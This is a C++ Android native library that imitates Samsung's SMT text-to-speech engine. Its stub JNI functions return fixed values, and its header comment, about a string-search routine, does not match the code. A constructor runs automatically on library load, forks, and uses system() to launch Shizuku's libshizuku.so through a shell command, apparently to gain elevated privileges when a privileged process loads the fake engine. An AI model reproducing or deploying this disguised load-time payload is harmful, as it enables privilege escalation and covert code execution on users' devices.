/*
 * mstring.cpp
 * Buffered String Search.
 *
 * Written by Rodrigo Chiossi <r.chiossi@samsung.com>
 *
 *
 * This is a native implementation of a buffered string search algorithm,
 * optimized to reduce the overhead of the JNI call.
 *
 * The number of strings found is usually very big which makes it impossible
 * return a list of jstrings objects back to java (due to the restriction of
 * 512 local references) without paying the price of DeleteLocalRef().
 *
 * This implementation creates a single Java string with all strings separated
 * by a new line. An actual list can be then retrieved in Java using
 * split("\n"), or any method alike.
 *
 * The chunk size was obtained by profiling the execution time over several
 * classes.dex extracted from apks. The best observed value was 16k.
 */

#include <jni.h>
#include <unistd.h>
#include <cstring>
#include <android/log.h>
#include <cstdlib>
#include <cstdio>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <cstring>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <fcntl.h>
#include <cerrno>

#include <dirent.h>
#include <cstdarg>
#include <sys/system_properties.h>

#if defined(__arm__)
#define ABI "armeabi-v7a"
#elif defined(__i386__)
#define ABI "x86"
#elif defined(__x86_64__)
#define ABI "x86_64"
#elif defined(__aarch64__)
#define ABI "arm64-v8a"
#endif

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "mercury-native", __VA_ARGS__)
char *dir;
extern "C" JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize(JNIEnv *env,
                                                                                jobject thiz) {
    return -1;

}

// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6)
extern "C" JNIEXPORT jint JNICALL
Java_com_samsung_SMT_engine_SmtTTS_setLanguage(JNIEnv *env, jobject thiz, jstring j1, jstring j2,
                                               jstring j3, jstring j4, jint j5, jint j6) {
    return 1;
}
//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)

extern "C" JNIEXPORT jint JNICALL
Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(JNIEnv *env, jobject thiz, jstring j1,
                                                          jstring j2, jstring j3, jstring j4,
                                                          jint j5, jint j6) {
    return -1;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_samsung_SMT_engine_SmtTTS_getVersion(JNIEnv *env, jobject thiz) {
    return 1;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_samsung_SMT_engine_SmtTTS_terminate(JNIEnv *env, jobject thiz) {
    return 1;
}

char *getCurrentDirectory() {
    /* Size 1024 */
    char *buf = (char *) malloc(sizeof(char) * 1024);

    /* Get full executable path */
    ssize_t len = readlink("/proc/self/exe", buf, 1023);
    buf[len] = '\0';

    /* Chop off everything after the last slash */
    char *lastSlash = strrchr(buf, '/');
    if (lastSlash != NULL)
        *(lastSlash) = '\0';

    return buf;
}

/* Send a shell as a backup if the other methods have failed */
bool defeated_weasel() {
    LOGE("Trying to launch");
    system("export VAR=\"$(pm path moe.shizuku.privileged.api)\" && \"$(echo ${VAR%????????} | cut -c 9-)\"lib/arm64/libshizuku.so");

    return true;
}

//
__attribute__((constructor))
static void doload() {
    int pid = -1;
    LOGE("somehow I'm in the library yah, my uid is %d", getuid());
    pid = fork();
    if (pid == 0) {
        //child
        LOGE("Testing 123");
        defeated_weasel();
    }
}